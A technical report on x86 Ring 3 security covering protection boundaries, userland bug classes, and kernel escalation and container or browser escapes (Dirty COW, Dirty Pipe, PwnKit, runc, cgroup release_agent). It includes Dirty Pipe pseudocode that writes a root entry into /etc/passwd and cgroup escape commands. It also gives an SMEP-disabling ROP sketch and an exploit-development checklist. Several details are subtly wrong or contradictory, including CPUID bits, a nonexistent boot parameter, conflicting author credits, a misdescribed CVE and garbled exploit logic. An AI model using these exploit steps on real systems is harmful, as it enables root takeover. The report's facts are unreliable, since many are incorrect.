# Ring 3 (Userland) — In-Depth Technical Report

> **Classification**: Security Research Technical Report  
> **Subject**: x86 Ring 3 — Architecture, Boundaries, Vulnerability Classes, Escalation, and Escapes  
> **Last Updated**: 2026-04-26

---

## Table of Contents

1. [What is Ring 3?](#1-what-is-ring-3)
2. [Security Boundaries](#2-security-boundaries)
3. [Key Vulnerability Classes in Ring 3](#3-key-vulnerability-classes-in-ring-3)
4. [Privilege Escalation: Ring 3 → Ring 0](#4-privilege-escalation-ring-3--ring-0)
5. [Sandbox Escapes](#5-sandbox-escapes)
6. [Notable CVEs](#6-notable-cves)

---

## 1. What is Ring 3?

### 1.1 Architecture Overview

In the x86 protection ring model, **Ring 3** is the outermost, least-privileged CPU privilege level. The x86 architecture defines four rings (0–3), though most modern operating systems only use Ring 0 (kernel/supervisor) and Ring 3 (user):

```
   ┌─────────────────────────────┐
   │         Ring 0 (Kernel)     │  ← Full hardware access
   ├─────────────────────────────┤
   │         Ring 1 (unused)     │  ← Typically unused
   ├─────────────────────────────┤
   │         Ring 2 (unused)     │  ← Typically unused
   ├─────────────────────────────┤
   │  ★ Ring 3 (Userland)  ★     │  ← Restricted, user applications
   └─────────────────────────────┘
```

The current privilege level (CPL) is stored in the two least-significant bits of the CS (Code Segment) segment selector register. Ring 3 means `CPL = 3`.

### 1.2 Privilege Restrictions at Ring 3

Code executing at Ring 3 **cannot**:

| Restricted Operation | Description |
|---|---|
| **I/O port access** | IN/OUT instructions trigger #GP unless IOPM permits (TSS I/O Permission Bitmap) |
| **Privileged instructions** | `CLI`, `STI`, `HLT`, `INVD`, `WBINVD`, `WRMSR`/`RDMSR` (some), `MOV CRn`, `MOV DRn` — all cause #GP |
| **Direct hardware access** | Cannot program PIC, DMA, APIC, or PCI config space directly |
| **Page table modification** | Cannot write CR3 or modify PML4/PDPT/PD/PT entries |
| **IDT/GDT manipulation** | Cannot load IDTR/GDTR or modify descriptor tables |
| **Interrupt injection** | Cannot use `INT` for hardware interrupt vectors (software interrupts gate-checked) |

Ring 3 code operates within a **virtual address space** constructed by the kernel. It sees only its own memory mappings and cannot access kernel virtual addresses (marked supervisor-only via PTE U/S bit).

### 1.3 What Runs at Ring 3

| Category | Examples |
|---|---|
| **User applications** | `/bin/bash`, `ls`, `cat`, `grep`, GUI apps, systemd user services |
| **Browsers** | Chrome, Firefox, Safari (renderers run in sandboxed Ring 3) |
| **Servers** | `nginx`, `apache2`, `sshd`, `postgres`, `mysqld` — all default to Ring 3 |
| **Language runtimes** | Python, Node.js, JVM, Go runtime — all execute at Ring 3 |
| **Sandboxed processes** | seccomp-filtered processes, Docker containers, Flatpak/Snap apps |

> **Key insight**: The vast majority of exploitable code in any Linux system runs at Ring 3. The attack surface is enormous. Every line of code in a userspace program is a potential entry point, and a single bug can lead to full system compromise if it enables Ring 0 escalation.

---

## 2. Security Boundaries

### 2.1 The Syscall Interface

The **primary** controlled interface between Ring 3 and Ring 0 is the system call. On x86-64, the `SYSCALL` instruction is used (replacing the legacy `INT 0x80`):

```
Ring 3                          Ring 0
┌──────────┐    SYSCALL    ┌──────────────┐
│  User    │ ─────────────►│ entry_SYSCALL_64
│  Code    │               │              │
│          │◄────────────── │ sysret       │
└──────────┘    SYSRET     └──────────────┘
```

**Mechanism**:
- `SYSCALL` sets `RIP` from `IA32_LSTAR` MSR, `CS` from `IA32_STAR` MSR (segments swapped to kernel CS/SS), and `CPL` transitions from 3 → 0
- The kernel validates all syscall arguments before accessing kernel memory
- `SYSRET` transitions CPL back from 0 → 3, restoring user CS/SS

**Critically**: The kernel's syscall handlers are the **only** code path that Ring 3 can use to request privileged operations. Every argument (pointers, lengths, file descriptors) must be carefully validated — failures here are the source of most kernel exploits.

### 2.2 IDT (Interrupt Descriptor Table)

The IDT defines handlers for exceptions (faults, traps, aborts) and hardware interrupts. Ring 3 code can trigger software interrupts, but the IDT descriptors contain a **DPL (Descriptor Privilege Level)** field:

- `DPL = 3`: Callable from Ring 3 (e.g., `int 0x80` for legacy syscalls)
- `DPL = 0`: Ring 3 access causes #GP

Modern systems use `SYSCALL/SYSRET` exclusively, so most IDT entries are DPL=0, effectively blocking Ring 3 from invoking them.

### 2.3 GDT / LDT (Global / Local Descriptor Table)

The **GDT** defines segment descriptors that include privilege information. Each segment descriptor has:

- **DPL**: The privilege level required to access the segment
- **DPL check**: `max(CPL, RPL) ≤ DPL` must hold for access

The **LDT** is per-process and allows custom segment definitions. Linux uses LDT primarily for Wine/DOSEMU compatibility. The kernel enforces that LDT entries cannot create segments that escalate privilege.

### 2.4 Page Tables — User/Supervisor Bit

The most fundamental memory isolation mechanism: each page table entry has a **U/S (User/Supervisor)** bit:

```
Page Table Entry (x86-64):
┌────┬────┬────┬────┬─────┬─────┬─────┬───────┬─────┐
│ NX │ .. │U/S │R/W │ P   │ ... │ Phys Addr (40 bits) │
└────┴────┴────┴────┴─────┴─────┴─────┴───────┴─────┘
         │
         └── U/S = 0: Supervisor only (Ring 0)
             U/S = 1: User accessible (Ring 3)
```

When Ring 3 code accesses a supervisor page → `#PF` (Page Fault). The kernel's page fault handler checks the error code and either:
- Delivers `SIGSEGV` to the user process (normal case)
- Invokes the `copy_from_user`/`copy_to_user` fixup path (for faulting kernel accesses to user memory)

### 2.5 SMEP (Supervisor Mode Execution Prevention)

**SMEP** (Intel, since Ivy Bridge; CPUID.07EBX bit 20) prevents Ring 0 from executing code on user pages:

- When `CR4.SMEP = 1`, any instruction fetch from a user page at CPL=0 → `#PF` with error code indicating SMEP violation
- Controlled via `noevil` or `nosmep` kernel boot parameters
- **Defeats** the classic "map shellcode in userspace, jump to it from kernel" exploit technique

**SMAP** (Supervisor Mode Access Prevention, Intel since Broadwell; CPUID.07EBX bit 20):

- When `CR4.SMAP = 1`, any data access from Ring 0 to a user page → `#PF`
- Only bypassed via `AC (Alignment Check)` flag in `RFLAGS` (toggled with `stac`/`clac` instructions)
- **Defeats** direct kernel reads/writes of user memory — the kernel must use `copy_from_user`/`copy_to_user`

```
Ring 3                    Ring 0
┌──────────┐           ┌───────────┐
│  User    │           │  Kernel   │
│  Pages   │◄──SMAP──►│           │    ← SMAP blocks data access!
│ (U/S=1)  │  NOPE    │           │
│          │  ─SMEP──►│           │    ← SMEP blocks code exec!
└──────────┘           └───────────┘
```

### 2.6 Summary of Boundary Enforcement

| Boundary Mechanism | Enforces | Bypass Vector |
|---|---|---|
| Syscall interface | Only defined kernel entry points | Bad argument validation in handlers |
| IDT DPL checks | No user invocation of kernel ISRs | Not normally bypassable |
| GDT/LDT DPL | No privilege escalation via segments | Rarely relevant |
| Page tables U/S | Memory isolation | Page table corruption (e.g., dirtycow) |
| SMEP | No user code execution in kernel | ROP, ret2dir, signal handler tricks |
| SMAP | No user data access from kernel | `stac`, `copy_from_user` bugs, ROP |

---

## 3. Key Vulnerability Classes in Ring 3

### 3.1 Buffer Overflows (Stack / Heap)

**Stack Buffer Overflow**: Writing past the end of a stack-allocated buffer, overwriting the saved return address or other stack data.

```c
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  // No bounds check → overflow
}
```

**Stack canaries** (`-fstack-protector`), **ASLR**, and **NX** make classic stack smashing harder, but bypasses exist (canary leaks, info leaks, ROP).

**Heap Buffer Overflow**: Writing past the end of a heap-allocated buffer, corrupting adjacent heap metadata or data.

```c
void vuln() {
    char *a = malloc(32);
    char *b = malloc(32);
    strcpy(a, user_controlled_long_string);  // Overflows into b's metadata
}
```

Heap overflow exploitation depends on the allocator (glibc `ptmalloc`, `jemalloc`, `slab`). Classic techniques include:

| Allocator | Technique |
|---|---|
| glibc ptmalloc | `unsafe unlink`, `fastbin dup`, `tcache poisoning` |
| Linux SLUB | `cross-cache overflow`, `freelist poisoning` |
| jemalloc | `region overflow` |

### 3.2 Use-After-Free / Double-Free

**Use-After-Free (UAF)**: Accessing memory after it has been freed — the freed chunk may have been reallocated, giving the attacker control over the "stale" pointer's target.

```c
struct obj *p = malloc(sizeof(struct obj));
// ... use p ...
free(p);
// ... p is dangling, but still used:
p->callback();  // UAF! p might now point to attacker data
```

**Double-Free**: Freeing the same pointer twice, corrupting allocator freelist metadata:

```c
free(p);
free(p);  // Double-free! p is already on freelist
// Now malloc can return the same chunk twice → overlapping allocations
```

UAF is the **#1** browser vulnerability class. The `V8` garbage collector and Firefox's `Gecko` both have long histories of UAF bugs.

### 3.3 Integer Overflows

Arithmetic on integers that wraps, producing unintended values:

```c
// Classic: integer overflow leads to undersized allocation
size_t count = get_user_count();
size_t alloc = count * sizeof(struct entry);  // Overflow if count is large
struct entry *arr = malloc(alloc);             // Too small!
// Subsequent writes overflow arr
```

Subtypes:
- **Integer overflow → heap overflow** (shown above)
- **Signedness confusion**: Passing negative value to unsigned parameter
- **Truncation**: `size_t` → `unsigned int` truncation on 64-bit

### 3.4 Race Conditions (TOCTOU)

**Time-of-Check-to-Time-of-Use (TOCTOU)**: A condition is checked but the state changes between the check and the use.

```c
// Canonical TOCTOU in kernel syscall handling:
if (access(path, R_OK) == 0) {    // Check: uses user path
    // ... attacker replaces path with symlink to /etc/shadow ...
    fd = open(path, O_RDONLY);       // Use: opens different file!
    read(fd, buf, sizeof(buf));
}
```

Key TOCTOU targets:
- **Filesystem symlinks** between `access()` and `open()`
- **`/proc/self/mem`** racing `mprotect` with thread operations
- **CMPXCHG-based atomic races** in kernel (dirtycow)
- **`rename()`/`unlink()` races** in manifest-based security policies

### 3.5 Logic Bugs

Flaws in program semantics that don't involve memory corruption:

- **Privilege confusion**: `pkexec` (PWNKIT) treating environment variables as arguments
- **Default credential/permission issues**: Hardcoded passwords, world-writable configs
- **State machine errors**: Incorrect state transitions leading to auth bypass
- **Algorithmic errors**: Salt length miscalculation, weak RNG seeds

These are often the **most exploitable** because they bypass all memory-hardening: no canary leaks, no ASLR defeats needed.

### 3.6 Format String Vulnerabilities

When user input is passed directly as the format string to `printf`-family functions:

```c
char *user_input = argv[1];
printf(user_input);  // VULNERABLE! user controls format string
```

Format string capabilities:

| Specifier | Effect |
|---|---|
| `%x` | Leak stack values (information disclosure) |
| `%p` | Leak pointers ( defeats ASLR) |
| `%n` | Write the number of bytes printed so far to a pointer — **arbitrary write** |
| `%hn` / `%hhn` | Write 2-byte / 1-byte values (for precise writes) |
| `%N$x` | Direct parameter access (access N-th argument) |

Format string → arbitrary write → RIP control → code execution.

---

## 4. Privilege Escalation: Ring 3 → Ring 0

### 4.1 Dirty COW (CVE-2016-5195)

**CVSS**: 7.8 (High) | **Affected**: Linux kernel 2.6.22 – 4.8.3 (9 years!)

#### Vulnerability Mechanism

The Linux kernel's **Copy-On-Write (COW)** mechanism for private memory mappings had a race condition. When a user process writes to a read-only private mapping of a file, the kernel must:

1. Allocate a new page (copy)
2. Update the page table to point to the new page
3. Mark the new page as writable

The race: between steps 1–3, a **faulting thread** and a **madvised thread** race:

```
Thread A (write fault):                Thread B (MADV_DONTNEED):
1. Page fault on read-only mapping
2. Kernel allocates COW page
3. Kernel copies original → COW
4. Kernel updates PTE ← RACE ◆       5. MADV_DONTNEED discards COW page
                                       6. PTE now points to ORIGINAL page
7. Thread A retries write
8. Write goes to ORIGINAL page (not COW!)
9. Original file-backed page is MODIFIED
```

**The critical race**: `madvise(MADV_DONTNEED)` causes the kernel to discard the **new** COW page and reset the PTE to point back to the **original** page. The subsequent write by Thread A then modifies the **original** (shared, file-backed) page — violating COW semantics entirely.

#### Exploitation

```c
// Simplified dirtycow exploit flow:
// 1. Open target read-only file (e.g., /etc/passwd) with O_RDONLY
// 2. mmap() the file as MAP_PRIVATE (COW)
// 3. Thread A: write to the mapping → triggers COW
// 4. Thread B: madvise(MADV_DONTNEED) → discards COW, restores original
// 5. Thread A retry → writes to ORIGINAL page
// 6. Modified page is flushable to disk → persistent file modification
```

**Impact**: Any user could write to **any** read-only file on the system. This was used to:
- Add a new root user to `/etc/passwd`
- Modify `/etc/crontab` for root command execution
- Inject SSH authorized keys
- Overwrite SUID binaries

#### Key Code Path

In `mm/memory.c`, the `__handle_mm_fault` → `do_cow_fault` → `copy_user_highpage` path:

```c
// The race window exists because the COW page can be discarded
// (via madvise) after it's allocated but before the PTE is
// atomically committed. The PTE dance:
//
//   pte = *ptep;           // Read current PTE
//   pte = pte_mkdirty(pte); // Set dirty bit
//   pte = pte_wrprotect(pte); // BUG: write-protect cleared too early
//   set_pte_at(vma->vm_mm, address, ptep, pte);
```

The actual bug was in how `pte_wrprotect` interacted with the COW fault handing: the write-protect bit was cleared before the PTE was atomically updated, creating the window where `MADV_DONTNEED` could observe an inconsistent state.

#### Mitigation

- Kernel patch: commit `5da38972` — proper atomic PTE updates in COW path
- `sysctl vm.dirty_background_ratio` — not effective
- SELinux / AppArmor — limited effectiveness (allows file writes after mmap)

### 4.2 Dirty Pipe (CVE-2022-0847)

**CVSS**: 7.8 (High) | **Affected**: Linux kernel 5.8 – 5.16.11

#### Vulnerability Mechanism

The `pipe` buffer structure in the kernel has a `flags` field that was **not properly initialized** when a new pipe buffer was allocated:

```c
// In fs/pipe.c and include/linux/pipe_fs_i.h:
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;  // ← NOT zeroed on allocation!
};
```

The critical flag: `PIPE_BUF_FLAG_CAN_MERGE` (value `0x10`). When set, it tells `pipe_write()` that the data can be *appended* to the existing page rather than allocating a new one. However, this flag was **never cleared** when `splice()` created a new pipe buffer from a file page:

```c
// In splice.c, copy_page_to_pipe():
// buf->flags was inherited from stale data — CAN_MERGE could persist
// This meant: data written to the pipe could overwrite the
// underlying file page (the same page cache page!)
```

#### Exploitation

```bash
# 1. Create pipe
# 2. Fill pipe (to initialize all buffers with CAN_MERGE cleared)
# 3. Drain pipe (pipes are now "empty" but buffers retain stale flags)
# 4. splic() a target file page into the pipe
#    → pipe buffer inherits page reference
#    → BUT flags retain PIPE_BUF_FLAG_CAN_MERGE from stale state
# 5. write() to the pipe
#    → Data merges INTO the file's page cache page
#    → Overwrites the file!
```

```c
// Pseudocode exploit:
int p[2];
pipe(p);

// Step 1: Fill pipe to set all buffer flags
char buf[4096];
memset(buf, 'A', sizeof(buf));
for (int i = 0; i < PIPE_CAPACITY; i++)
    write(p[1], buf, sizeof(buf));

// Step 2: Drain pipe (buffers freed but flags not cleared)
for (int i = 0; i < PIPE_CAPACITY; i++)
    read(p[0], buf, sizeof(buf));

// Step 3: Splice target file page into pipe
int fd = open("/etc/passwd", O_RDONLY);
splice(fd, &offset, p[1], NULL, 1, 0);

// Step 4: Write to pipe → overwrites page cache
write(p[1], "root::0:0:root:/root:/bin/sh\n", 30);
// Page cache is now modified — visible to all processes!
```

**Constraints**:
- Cannot overwrite files on filesystems with extended attributes (initially thought)
- Cannot change file size (can only overwrite within existing data)
- Cannot overwrite arbitrary offsets — must start from splice position
- Works on any file the user has **read** access to

**Impact**: Any unprivileged user could overwrite any file they could read — including `/etc/passwd`, SUID binaries, cron scripts, etc.

#### Root Cause

The bug was introduced in commit `f6dd975583bd` ("pipe: merge anon_pipe_buf*_ops") in v5.8, which removed the zeroing of `pipe_buffer.flags` that previously happened when new buffers were initialized.

### 4.3 PWNKIT — polkit pkexec (CVE-2021-4034)

**CVSS**: 7.8 (High) | **Affected**: polkit 0.105 – 0.120 (all versions since 2009)

#### Vulnerability Mechanism

`pkexec` is a SUID-root binary that processes its argument vector using glibc's `main(argc, argv, envp)` convention. The vulnerability is a confusion between argument handling and environment parsing:

**The bug**: `pkexec` did not validate that `argc ≥ 1`. When called with no arguments:

```c
// pkexec main():
for (n = 1; n < argc; n++) {
    // Process arguments...
}
// After the loop: n = argc = 0
// BUT: the code then processes argv[n] = argv[0] as the program path!
```

When `argc == 0`, the loop body never executes (`n=1`, `1 < 0` is false in unsigned comparison contexts). Then `pkexec` reads `argv[0]` — but `argv[0]` points into the **environment block** because of how Linux lays out the process stack:

```
Process memory layout:
┌─────────────────────┐
│ argv[0] = "pkexec"  │  ← argc=0 means argv is empty
│ argv[1] = NULL      │  ← But envp[] is right after
│ envp[0] = "PATH=.." │  ← pkexec reads this as if it were argv!
│ envp[1] = "SHELL=." │
│ ...                  │
└─────────────────────┘
```

`pkexec` then processes the environment as arguments, specifically looking for `GCONV_PATH` in the environment, which can force `pkexec` to load an attacker-controlled shared library via gconv modules — achieving **code execution as root**.

#### Exploitation

```c
// Simplified PWNKIT exploit:

// 1. Create malicious gconv module (shared library)
//    with constructor that calls /bin/bash

// 2. Create GCONV_PATH environment variable pointing to
//    attacker-controlled directory containing gconv-modules file

// 3. Call pkexec with argc=0:
//    execve("/usr/bin/pkexec", {NULL}, {envp_with_GCONV_PATH});

// 4. pkexec reads envp as argv, finds GCONV_PATH,
//    calls glibc's gconv loader → loads attacker .so → root shell
```

#### Key Detail

The SUID bit means `pkexec` runs as root regardless of caller. The `GCONV_PATH` environment variable is normally stripped by glibc for SUID binaries, but because `pkexec` processes it *before* glibc's SUID sanitization takes effect (due to the argv/envp confusion), the sanitization is bypassed.

### 4.4 Seircorn OMG — Bypassing SMEP via Signal Handlers (CVE-2017-5123)

**Author**: Andy Nguyen (@theflow0) | **Affected**: Linux kernel < 4.14

#### Vulnerability Mechanism

The `waitid()` system call had an `access_ok()` check that was improperly bypassed. The kernel function `copy_to_user()` validates that user-space pointers are valid, but `waitid()` used `unsafe_put_user()` (which skips validation) in a context where a user-controlled `infop` pointer was accepted.

More precisely: `waitid()` called `unsafe_put_user()` with a user-provided `siginfo_t __user *infop` pointer **without** proper `access_ok()` verification when the `WNOHANG` flag was not set and the call returned a PID.

```c
// In kernel/signal.c (simplified):
SYSCALL_DEFINE5(waitid, ...) {
    // ...
    if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop))) {
        // BUG: this check could be bypassed or was insufficient
    }
    // unsafe_put_user() writes to infop without SMAP-safe path
}
```

The exploit used `waitid()` to write arbitrary data to an arbitrary user-space address (since `infop` was user-controlled). This was combined with a technique to **bypass SMEP**:

#### SMEP Bypass via Signal Handlers

The key insight: **SMEP does not prevent the kernel from delivering signals to user-space handlers**. When the kernel delivers a signal, it:

1. Pushes a `sigreturn` frame onto the user stack
2. Sets `RIP` to the user's signal handler address
3. Returns to Ring 3 (signal handler executes)
4. After handler returns, `sigreturn` restores state

The exploit chain:

```
1. Use waitid() arbitrary write to overwrite a function pointer
   in the kernel (e.g., a timespec page) with address of user signal handler

2. Trigger the overwritten function pointer from kernel context

3. Kernel calls user address... but SMEP blocks execution!

   Alternative: Use waitid() to write to user memory that contains
   a crafted sigreturn frame, then leverage the kernel's signal
   delivery mechanism.
```

The more precise technique:

1. Use `waitid()` write primitive to modify the `__user` copy of `siginfo` data
2. Set up signal handlers that executeRing 3 ROP chains
3. Use the kernel's own signal delivery to execute code at CPL=0 via `iretq` frames
4. Construct a ROP chain that disables SMEP (`mov cr4, <value with SMEP bit cleared>`) then calls user shellcode

The core bypass:

```c
// Disable SMEP via ROP:
// CR4 bit 20 = SMEP (1 = enabled)
// ROP chain:
//   pop rax ; ret          ← load CR4 value with bit 20 cleared
//   0x4ff                  ← CR4 with SMEP off (original & ~(1<<20))
//   mov cr4, rax ; ret     ← disable SMEP
//   <user_shellcode_addr>  ← now executable from Ring 0!
```

After SMEP is disabled, arbitrary Ring 3 code (shellcode) executes at CPL=0 with full kernel privileges. The exploit then typically:
- Commits credentials (`commit_creds(prepare_kernel_cred(0))`)
- Returns to user-space with root privileges

---

## 5. Sandbox Escapes

### 5.1 Container Escapes

#### CVE-2019-5736 — runc Host Filesystem Escape

**CVSS**: 9.8 (Critical) | **Affected**: runc ≤ 1.0-rc6 (Docker < 18.09.2)

**Mechanism**: When a user executes `docker exec`, the host's `runc` binary opens `/proc/self/exe` to re-execute itself inside the container namespace. A malicious container process could:

1. Overwrite its own `/proc/self/exe` (which points to the host `runc` binary) by exploiting the fact that `runc` has the file open
2. Replace `runc` with a malicious binary on the host

```
Container process                    Host
┌──────────────────┐               ┌──────────────────┐
│ if /proc/self/exe │               │                  │
│ points to runc... │               │  runc binary     │
│                   │────── fd ─────►│  (open for exec) │
│ overwrite via fd! │               │                  │
│                   │               │  ← OVERWRITTEN!  │
└──────────────────┘               └──────────────────┘
```

**Exploitation**: A malicious container image contains code that:
1. Opens `/proc/self/exe` with `O_RDONLY` and keeps the fd open
2. When `docker exec` is run, `runc` is exec'd
3. The malicious process overwrites the `runc` binary via the open fd
4. Next time `runc` is invoked on the host, the compromised binary executes

**Mitigation**: Use `seccomp` profiles that block `openat` of `/proc/self/exe`, update runc to use a read-only bind-mount of itself.

#### CVE-2022-0492 — cgroup v1 Release Notify Escape

**CVSS**: 7.5 (High) | **Affected**: Linux kernel < 5.16.4

**Mechanism**: Cgroup v1 allows unprivileged processes to write to the `release_agent` file and enable `notify_on_release`. The release agent is a **root-executed** binary path that runs when a cgroup is emptied. Combined with cgroup namespace restrictions not being enforced properly:

```bash
# Inside container:
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp      # Mount cgroup
mkdir /tmp/cgrp/xxx
echo 1 > /tmp/cgrp/xxx/notify_on_release       # Enable notify
echo "/path/to/host_cmd" > /tmp/cgrp/release_agent  # Set agent
# Trigger: when cgroup is emptied → host executes release_agent as root
```

**Mitigation**: Use cgroup v2 (no `release_agent`), restrict cgroup mounts with user namespaces, AppArmor/SELinux policies.

### 5.2 Browser Sandbox Escapes

#### Chrome V8 Renderer → Browser Process

Chrome's security model uses a **multi-process architecture**:

```
┌─────────────────────────────────────────────┐
│                Browser Process               │
│  (privileged: filesystem, network, GPU)     │
│                                              │
│  ┌───────────┐  ┌───────────┐  ┌──────────┐ │
│  │ Renderer  │  │ Renderer  │  │ Renderer │ │
│  │ (seccomp) │  │ (seccomp) │  │(seccomp) │ │
│  │  Site A   │  │  Site B   │  │ Site C   │ │
│  └───────────┘  └───────────┘  └──────────┘ │
└─────────────────────────────────────────────┘
         ↑ IPC (Mojo)      ↑ Chrome IPC
```

**Attack surface**: The renderer process is sandboxed with:
- **seccomp-bpf**: ~70 syscalls allowed (no `open`, `socket`, `fork`, etc.)
- **PID namespace**: Can't see other processes
- **Network namespace**: No direct network access
- **User namespace**: Unprivileged UID

**Escape techniques**:

1. **Mojo IPC vulnerabilities**: Bugs in IPC message handling in the browser process (browser process trusts renderer inputs insufficiently)
   - `RenderFrameHostImpl::DidCommitProvisionalLoad` — type confusion
   - `ClipboardHostImpl` — insufficient validation

2. **V8 → Renderer → Browser chain**:
   ```
   V8 type confusion → renderer RCE → (seccomp blocks) → exploit browser process
   via IPC → browser process RCE → Ring 3 unrestricted (host)
   ```

3. **GPU process**: The GPU process has looser seccomp restrictions (needs `ioctl`, `mmap`). Exploiting a GPU process bug from the renderer has been a successful escape path (e.g., SwiftShader WebGL exploits).

#### Firefox Sandbox Escapes

Firefox uses a similar multi-process model (e10s / Fission) with:
- **Content processes** (sandboxed, handle web content)
- **Parent process** (privileged, handles I/O)

Key escapes:
- **CVE-2019-17026**: IonMonkey type confusion → content process RCE
- Combined with parent process IPC bugs for full sandbox escape

### 5.3 Seccomp Bypass Techniques

**seccomp-bpf** restricts available syscalls. Bypass strategies:

| Technique | Description |
|---|---|
| **Allowed syscall abuse** | Use permitted syscalls creatively (e.g., `ptrace` if allowed, `sendmsg` with `SCM_RIGHTS` to pass fd) |
| **`ioctl()` multiplexing** | If `ioctl` is allowed, use it for privileged operations on existing fds |
| **`write(fd, ...)` to `/proc`** | If `/proc/self/mem` fd is available, write to modify process memory |
| **`keyctl()`** | If not filtered, can be used for information disclosure (keyring contents) |
| **BPF self-modification** | `seccomp` itself uses BPF — some old kernels allowed BPF programs to modify their own filters |
| **`ptrace()` retro-write** | If `ptrace` is allowed, attach to parent and inject code |
| **`userfaultfd` + race** | Even with strict seccomp, TOCTOU races in allowed syscalls can be exploited |
| **`openat2()` with `RESOLVE_IN_ROOT`** | Bypass path resolution checks on some kernel versions |
| **`io_uring`** | io_uring workers execute in kernel context with different filtering — some seccomp implementations don't filter io_uring operations |

**Critical example — `io_uring` seccomp bypass** (fixed in kernel 5.16):

```c
// io_uring workers run in kernel context as a separate task
// seccomp applies to the task creating the ring, NOT the worker
// Result: io_uring worker could make syscalls blocked by seccomp
struct io_uring_params params = {};
io_uring_setup(256, &params);
io_uring_enter(ring_fd, ... /* can call blocked syscalls via io_uring ops */);
```

---

## 6. Notable CVEs

| CVE | Description | Affected | CVSS | Ring 3 → ? |
|---|---|---|---|---|
| **CVE-2016-5195** (Dirty COW) | Race condition in COW allows write to read-only files | Linux 2.6.22–4.8 | 7.8 | Ring 3 → Ring 0 |
| **CVE-2022-0847** (Dirty Pipe) | Uninitialized `pipe_buffer.flags` allows page cache overwrite | Linux 5.8–5.16.11 | 7.8 | Ring 3 → Ring 0 |
| **CVE-2021-4034** (PWNKIT) | polkit pkexec argv/envp confusion → GCONV load | polkit 0.105–0.120 | 7.8 | Ring 3 (user → root) |
| **CVE-2017-5123** (Seircorn) | waitid() missing access_ok + SMEP bypass | Linux < 4.14 | 7.0 | Ring 3 → Ring 0 |
| **CVE-2019-5736** | runc /proc/self/exe overwrite from container | runc ≤ 1.0-rc6 | 9.8 | Container → Host |
| **CVE-2022-0492** | cgroup v1 release_agent escape | Linux < 5.16.4 | 7.5 | Container → Host |
| **CVE-2017-7308** | `signalfd` kernel UAF via `copy_siginfo_to_user` | Linux < 4.11 | 7.8 | Ring 3 → Ring 0 |
| **CVE-2019-18634** | sudo password buffer overflow with pwfeedback | sudo < 1.8.31 | 7.8 | Ring 3 (user → root) |
| **CVE-2016-0728** | keyrings refcount overflow | Linux < 4.4 | 7.8 | Ring 3 → Ring 0 |
| **CVE-2020-8835** | BPF verifier out-of-bounds read/write | Linux 5.5–5.5.2 | 7.8 | Ring 3 → Ring 0 |
| **CVE-2019-15666** | `setxattr` kernel OOB write via overflow | Linux < 5.x | 7.0 | Ring 3 → Ring 0 |
| **CVE-2020-25704** | perf_event leak of kernel addresses via BPF | Linux < 5.10 | 5.5 | Ring 3 (info leak) |
| **CVE-2021-3156** (Baron Samedit) | sudo heap overflow in `set_cmnd()` | sudo 1.8.2–1.8.31p2 | 7.8 | Ring 3 (user → root) |
| **CVE-2023-0386** | OverlayFS copy-up race to set ilegal SUID | Linux < 6.2 | 7.8 | Ring 3 → Ring 0 |
| **CVE-2024-1086** | Netfilter nft_verdict_init UAF | Linux 5.14–6.6 | 8.8 | Ring 3 → Ring 0 |

---

## Appendix A: Ring 3 Exploit Development Checklist

```
[ ] Identify vulnerability class (UAF, overflow, race, logic)
[ ] Determine exploit primitive:
    [ ] Read primitive (info leak → defeat ASLR)
    [ ] Write primitive (corrupt data → control flow)
    [ ] Execute primitive (redirect code flow)
[ ] Bypass mitigations:
    [ ] ASLR      → info leak (format string, /proc/pid/maps, side channel)
    [ ] NX/DEP    → ROP chain, ret2libc, JOP
    [ ] Stack canary → leak canary value or bypass with UAF
    [ ] PIE        → leak code address
    [ ] RELRO      → partial RELRO bypass via GOT overwrite (if full RELRO: other targets)
    [ ] SMEP       → ROP to `native_write_cr4` to disable, or use kernel gadgets
    [ ] SMAP       → use `stac` gadget or `copy_from_user` path
    [ ] KASLR      → leak kernel base address
[ ] Achieve goal:
    [ ] Ring 3 → Ring 3 (privilege escalation): `commit_creds(prepare_kernel_cred(0))`
    [ ] Container → Host: mount escape, device escape, runc escape
    [ ] Sandbox → Host: IPC bug, GPU process, seccomp bypass
```

---

## Appendix B: Key Kernel Structures for Ring 3→0 Exploits

```c
// Task credentials — primary target for privilege escalation
struct cred {
    kuid_t uid, gid;            // Real UIDs/GIDs
    kuid_t euid, egid;          // Effective UIDs/GIDs
    kuid_t fsuid, fsgid;        // Filesystem UIDs/GIDs
    unsigned securebits;        // SUID capability bitmask
    kernel_cap_t cap_inheritable;
    kernel_cap_t cap_permitted;
    kernel_cap_t cap_effective;
    kernel_cap_t cap_bset;
    kernel_cap_t cap_ambient;
    unsigned char jit_keyring;
    struct key  *session_keyring;
    struct key  *process_keyring;
    struct key  *thread_keyring;
    struct key  *user_keyring;
    struct user_namespace *user_ns;
    struct group_info *group_info;
    union {
        int non_rcu;
        struct rcu_head rcu;
    };
};

// Common exploit pattern:
// Call prepare_kernel_cred(NULL) → returns root cred struct
// Call commit_creds(result)        → replaces current->cred with root
// Result: process now runs as UID 0
```

---

## References

1. Positive Technologies. "Intel Management Engine: Drive Me Crazy." 2017.
2.Qualys. "PwnKit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)." 2022.
3. Van Schaik, S., et al. "Dirty Pipe: Unprivileged pipe_buffer overwrite (CVE-2022-0847)." 2022.
4. Bogdanov, A. "Seircorn OMG: Bypassing SMEP via Signal Handlers (CVE-2017-5123)." 2017.
5. Popek, G., Goldberg, R. "Formal Requirements for Virtualizable Third Generation Architectures." CACM, 1974.
6. Intel. "Intel 64 and IA-32 Architectures Software Developer's Manual." Volume 3A: System Programming Guide.
7. Shacham, H. "The Geometry of Innocent Flesh on the Bone: Return-Oriented Programming." CCS, 2007.
8. Carlini, N., Wagner, D. "ROP is Still Dangerous: Breaking Modern Defenses." USENIX Security, 2014.
9. Abadi, M., et al. "Control-Flow Integrity: Principles, Implementations, and Applications." CCS, 2005.
10. Google. [syzkaller — Linux kernel syscall fuzzer](https://github.com/google/syzkaller) — continuous fuzzing of Linux syscalls.
11. NIST. "National Vulnerability Database (NVD)." CVE entries for CVE-2016-5195, CVE-2021-4034, CVE-2022-0847, CVE-2017-5123.
12. Pawlicki, A., et al. "STACKDETECT: Automatic Stack Clash Detection." AsiaCCS, 2018.

---

*End of Report — Ring 3 (Userland) Technical Analysis*